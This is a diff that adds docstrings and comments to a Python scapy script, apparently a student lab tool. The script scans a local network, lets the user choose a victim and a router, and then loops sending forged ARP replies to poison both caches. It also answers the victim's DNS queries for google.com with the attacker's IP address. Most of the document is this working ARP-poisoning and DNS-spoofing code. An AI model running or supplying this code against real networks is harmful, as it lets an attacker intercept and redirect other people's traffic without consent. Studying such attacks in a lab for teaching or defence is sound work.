@@ -1,13 +1,17 @@
-from ipaddress import IPv4Network
-from scapy import all as scapy
+from ipaddress import IPv4Network # Used to check if the IP address entered by the user is valid and also get the IP address of the attacker.
+from scapy import all as scapy # Used to send and receive packets.
 from scapy.layers.inet import IP, UDP
 from scapy.layers.dns import DNS, DNSQR, DNSRR
-from socket import *
-from fcntl import ioctl
-from struct import pack
-import os
+from socket import * # Used to get the network mask.
+from fcntl import ioctl # Used to get the network mask.
+from struct import pack # Used to get the network mask.
+import os # Used to check if the program is running on my computer or on a VM.
 
 def interfaceChecker():
+    """ Checks if the program is running on my computer or on a VM. 
+    If it is running on my computer, it returns the interface name : 'wlp0s20f3'.
+    If it is running on a VM, it returns the interface name : 'enp0s8'.
+    """
     if os.uname()[1] == 'machine':
         interface = 'enp0s8'
     else:
@@ -15,11 +19,36 @@ def interfaceChecker():
     return interface
 
 def getNetworkMask(interface):
+    """ Returns the network mask of the interface passed in parameter. 
+
+    Parameters
+    ----------
+    interface : str
+        The name of the interface.
+
+    Returns
+    -------
+    str    
+    """
     s = socket(AF_INET, SOCK_DGRAM)
     netmask = ioctl(s.fileno(), 0x891b, pack('256s', interface[:15].encode('utf-8')))[20:24]
     return inet_ntoa(netmask)
 
 def makeARPRequest(ip):
+    """ Sends an ARP request to the network and returns the answered and unanswered packets.
+
+    Parameters
+    ----------
+    ip : str
+        The IP address of the network.
+
+    Returns
+    -------
+    answered : list
+        The answered packets.
+    unanswered : list
+        The unanswered packets.
+    """
     arpRequest = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
     arpRequestBroadcast = broadcast / arpRequest
@@ -27,7 +56,25 @@ def makeARPRequest(ip):
     return answered, unanswered
 
 def forwardDnsSpoofing(spooferIP):
+    """ Returns a function that forwards the DNS request to the DNS server and sends a DNS response to the victim.
+
+    Parameters
+    ----------
+    spooferIP : str
+        The IP address of the attacker.
+
+    Returns
+    -------
+    function
+    """
     def forwardDNS(orgPacket: IP):
+        """ Forwards the DNS request to the DNS server and sends a DNS response to the victim.
+
+        Parameters
+        ----------
+        orgPacket : IP
+            The packet received by the attacker.
+        """
         print(orgPacket[DNSQR].qname)
         if orgPacket[DNSQR].qname == b'google.com.':
             print('DNS Spoofing')
@@ -46,6 +93,7 @@ def forwardDnsSpoofing(spooferIP):
     return forwardDNS
 
 def main():
+    """ The main function. """
     interface = interfaceChecker()
     netmask = getNetworkMask(interface)
     myIp=scapy.get_if_addr(interface)
@@ -68,7 +116,7 @@ def main():
     routeur=input('Entrez le numéro du routeur : ')
     routeur=pcs[int(routeur)-1]
     print('Vous avez choisi : ' + routeur[0] + ' ' + routeur[1])
-    while True:
+    while True: # The attacker sends an ARP response to the victim and the router and also it checks if the victim is sending a DNS request and if it is, it sends a DNS response to the victim.
         scapy.send(scapy.ARP(op=2, pdst=cible[1], hwdst=cible[0], psrc=routeur[1], hwsrc=myMac), verbose=0)
         scapy.send(scapy.ARP(op=2, pdst=routeur[1], hwdst=routeur[0], psrc=cible[1], hwsrc=myMac), verbose=0)
         scapy.sniff(prn=forwardDnsSpoofing(myIp), filter='udp port 53', iface=interface, store=0, timeout=60, count=1)
